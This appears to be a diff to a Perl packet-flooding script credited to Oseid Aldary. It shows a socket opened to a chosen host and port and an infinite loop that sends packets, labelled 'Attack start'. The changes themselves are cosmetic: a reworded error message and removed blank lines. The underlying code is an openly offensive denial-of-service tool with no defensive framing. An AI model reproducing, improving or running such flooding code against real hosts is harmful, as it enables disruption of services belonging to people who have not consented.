@@ -61,9 +61,7 @@ sleep(3);
 $sock = IO::Socket::INET->new (
 	PeerAddr => $host,
 	PeerPort => $port,
-	Proto => "$proto" ) || die "\n start Attack !";
-
-
+	Proto => "$proto" ) || die "\n[!] Something Went Wrong ";
 }
 packets:
 while (1) {
@@ -81,7 +79,6 @@ send($sock, $size, $size); # Attack start################
 
 }
 
-
 ##############################################################
 #####################                #########################
 #####################  END OF SCRIPT #########################
@@ -90,6 +87,4 @@ send($sock, $size, $size); # Attack start################
 #This Script by Oseid Aldary
 #Have a nice day :)
 #GoodBye
-
-
 
